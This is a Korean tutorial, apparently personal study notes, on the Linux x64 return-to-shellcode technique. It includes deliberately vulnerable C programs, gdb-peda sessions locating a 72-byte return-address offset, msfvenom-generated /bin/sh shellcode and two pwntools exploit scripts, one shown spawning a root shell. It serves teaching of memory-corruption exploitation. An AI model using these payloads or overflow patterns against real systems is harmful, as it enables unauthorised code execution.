# 01. Return to Shellcode
* ret 주소를 변경하여 Shellcode를 가리키게 함
* ret 주소를 변경할 수 있는 방법(overflow)과 shellcode 영역에 실행 권한이 있어야함

## 선행지식1: CALL & RET 이해하기
* 두명령어는 아래와 같은 실행을 진행
  * call operation: 리턴주소를 스택에 저장하고, 그 주소로 이동
    * PUSH RetrunAddress
    * JMP operation

  * ret: POP으로 스택에 가장 상위의 값을 RIP에 저장하고, 해당 주소로 이동
    * POP RIP -> JMP RIP
```
#include <stdio.h>
#include <unistd.h>

void vuln(){
}

void main(){
    vuln();
}
```


## 선행지식2: 메모리의 실행권한 확인
* 메모리는 실행권한이 r, w, x로 나누어져있음(읽기, 쓰기, 실행)
* 최신 gcc는 일반적으로 DEP(NX bit)가 적용되므로 코드 영역만 실행권한 설정됨
* 스택에서 shellcode 실행을 위해서는 컴파일 과정에서 -z execstack 추가해야 함
1. maps 정보 확인
```
root@attacker:~/Study/LinuxExTech/01.ReturnToShellcode# ./stackmemory &
[1] 4507
root@attacker:~/Study/LinuxExTech/01.ReturnToShellcode# ps -ef | grep stackmemory
root       4514   2221  0 23:44 pts/0    00:00:00 grep stackmemory
[1]+  Done                    ./stackmemory
root@attacker:~/Study/LinuxExTech/01.ReturnToShellcode# cat /proc/2221/maps
55cf9248b000-55cf924b7000 r--p 00000000 08:01 131267                     /usr/bin/bash
55cf924b7000-55cf9255b000 r-xp 0002c000 08:01 131267                     /usr/bin/bash
55cf9255b000-55cf9258f000 r--p 000d0000 08:01 131267                     /usr/bin/bash
55cf92590000-55cf92593000 r--p 00104000 08:01 131267                     /usr/bin/bash
55cf92593000-55cf9259c000 rw-p 00107000 08:01 131267                     /usr/bin/bash
55cf9259c000-55cf925a6000 rw-p 00000000 00:00 0
55cf92ee8000-55cf931c1000 rw-p 00000000 00:00 0                          [heap]
7fe022c6a000-7fe022c6d000 r--p 00000000 08:01 157600                     /usr/lib/x86_64-lin
```
2. checksec.sh 사용
* http://www.trapkit.de/tools/checksec.html


## Shellcode 만들기
* 메뉴얼로 만드는 방법은 별도 강좌 참고
* metasploit의 msfvenom을 이용하여 쉽게 제작 가능
```
root@attacker:~/Study/LinuxExTech/01.ReturnToShellcode# msfvenom -f python -p linux/x64/exec CMD=/bin/sh
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes
Final size of python file: 238 bytes
buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"
```

## 취약 프로그램 1
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

```
root@attacker:~/Study/LinuxExTech/01.ReturnToShellcode# gdb -q rts01
Reading symbols from rts01...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401122 <+0>:	push   rbp
   0x0000000000401123 <+1>:	mov    rbp,rsp
   0x0000000000401126 <+4>:	sub    rsp,0x50
   0x000000000040112a <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x000000000040112d <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000401131 <+15>:	lea    rax,[rbp-0x40]
   0x0000000000401135 <+19>:	mov    rdi,rax
   0x0000000000401138 <+22>:	mov    eax,0x0
   0x000000000040113d <+27>:	call   0x401030 <gets@plt>
   0x0000000000401142 <+32>:	mov    eax,0x0
   0x0000000000401147 <+37>:	leave  
   0x0000000000401148 <+38>:	ret    
End of assembler dump.
gdb-peda$ b *main+38
Breakpoint 1 at 0x401148
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /root/Study/LinuxExTech/01.ReturnToShellcode/rts01
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
gdb-peda$ x/s $rsp
0x7fffffffe0e8:	"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"
JAAfAA5AAKAAgAA6AAL found at offset: 72
gdb-peda$ pattern offset IAAeAA4AAJAAfAA5AAKAAgAA6AAL
IAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 72

```
```
from pwn import *

p = process(['./rts01'])

OFFSET = 72
buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"
shelladdr = p64(0x7fffffffe0f0)
payload = "A"*72 + shelladdr + buf

p.sendline(payload)
p.interactive()

```

## 취약 프로그램2
```
#include <stdio.h>
#include <unistd.h>

void vuln(){
    char buf[50];
    printf("buf[50] address : %p\n",buf);
    read(0, buf, 100);
}

void main(){
    vuln();
}
```
```
root@Hack:~/Study/Exploitation/ReturnToShellcode# gdb -q rts2
Reading symbols from rts2...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x000000000000117e <+0>:	push   rbp
   0x000000000000117f <+1>:	mov    rbp,rsp
   0x0000000000001182 <+4>:	mov    eax,0x0
   0x0000000000001187 <+9>:	call   0x1145 <vuln>
   0x000000000000118c <+14>:	nop
   0x000000000000118d <+15>:	pop    rbp
   0x000000000000118e <+16>:	ret    
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x0000000000001145 <+0>:	push   rbp
   0x0000000000001146 <+1>:	mov    rbp,rsp
   0x0000000000001149 <+4>:	sub    rsp,0x40
   0x000000000000114d <+8>:	lea    rax,[rbp-0x40]
   0x0000000000001151 <+12>:	mov    rsi,rax
   0x0000000000001154 <+15>:	lea    rdi,[rip+0xea9]        # 0x2004
   0x000000000000115b <+22>:	mov    eax,0x0
   0x0000000000001160 <+27>:	call   0x1030 <printf@plt>
   0x0000000000001165 <+32>:	lea    rax,[rbp-0x40]
   0x0000000000001169 <+36>:	mov    edx,0x64
   0x000000000000116e <+41>:	mov    rsi,rax
   0x0000000000001171 <+44>:	mov    edi,0x0
   0x0000000000001176 <+49>:	call   0x1040 <read@plt>
   0x000000000000117b <+54>:	nop
   0x000000000000117c <+55>:	leave  
   0x000000000000117d <+56>:	ret    
End of assembler dump.
gdb-peda$ b *vuln+0
Breakpoint 1 at 0x1145
gdb-peda$ b *vuln+49
Breakpoint 2 at 0x1176
gdb-peda$ b *vuln+56
Breakpoint 3 at 0x117d
gdb-peda$ r
Starting program: /root/Study/Exploitation/ReturnToShellcode/rts2
gdb-peda$ disass main
Dump of assembler code for function main:
   0x000055555555517e <+0>:	push   rbp
   0x000055555555517f <+1>:	mov    rbp,rsp
   0x0000555555555182 <+4>:	mov    eax,0x0
   0x0000555555555187 <+9>:	call   0x555555555145 <vuln>
   0x000055555555518c <+14>:	nop
   0x000055555555518d <+15>:	pop    rbp
   0x000055555555518e <+16>:	ret    
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
=> 0x0000555555555145 <+0>:	push   rbp
   0x0000555555555146 <+1>:	mov    rbp,rsp
   0x0000555555555149 <+4>:	sub    rsp,0x40
   0x000055555555514d <+8>:	lea    rax,[rbp-0x40]
   0x0000555555555151 <+12>:	mov    rsi,rax
   0x0000555555555154 <+15>:	lea    rdi,[rip+0xea9]        # 0x555555556004
   0x000055555555515b <+22>:	mov    eax,0x0
   0x0000555555555160 <+27>:	call   0x555555555030 <printf@plt>
   0x0000555555555165 <+32>:	lea    rax,[rbp-0x40]
   0x0000555555555169 <+36>:	mov    edx,0x64
   0x000055555555516e <+41>:	mov    rsi,rax
   0x0000555555555171 <+44>:	mov    edi,0x0
   0x0000555555555176 <+49>:	call   0x555555555040 <read@plt>
   0x000055555555517b <+54>:	nop
   0x000055555555517c <+55>:	leave  
   0x000055555555517d <+56>:	ret    
End of assembler dump.
gdb-peda$
gdb-peda$ i r $rsp
rsp            0x7fffffffe0e8	0x7fffffffe0e8
gdb-peda$ i r $rbp
rbp            0x7fffffffe0f0	0x7fffffffe0f0  
gdb-peda$ x/x $rsp
0x7fffffffe0e8:	0x000055555555518c  <--call이후 돌아갈 주소(vuln의 ret)

gdb-peda$ conti
Continuing.
buf[50] address : 0x7fffffffe0a0

Breakpoint 2, 0x0000555555555176 in vuln ()
gdb-peda$ p/d 0x7fffffffe0e8 - 0x7fffffffe0a0
$2 = 72
gdb-peda$ x/bs 0x7fffffffe0a0
0x7fffffffe0a0:	"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"
gdb-peda$ conti
Breakpoint 3, 0x000055555555517d in vuln ()
gdb-peda$ pattern offset IAAeAA4AAJAAfAA5AAKAAgAA6AAL
IAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 72
gdb-peda$ x/bs 0x7fffffffe0e8
0x7fffffffe0e8:	"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"
gdb-peda$
```
```
root@Hack:~/Study/Exploitation/ReturnToShellcode# cat ex_rts2.py
from pwn import *

shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
shell += "\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
shell += "\x54\x5f\x99\x52\x57\x54\x5e\xb0"
shell += "\x3b\x0f\x05"

OFFSET = 72 - len(shell)

p = process(['./rts2'])

p.recvuntil('buf[50] address : ')
bufaddr = p.recvuntil('\n')
bufaddr = int(bufaddr, 16)
bufaddr = p64(bufaddr)

payload = shell + "\x90"*OFFSET + bufaddr
p.send(payload)
p.interactive()
root@Hack:~/Study/Exploitation/ReturnToShellcode# python ex_rts2.py
[+] Starting local process './rts2': pid 3382
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$  
```
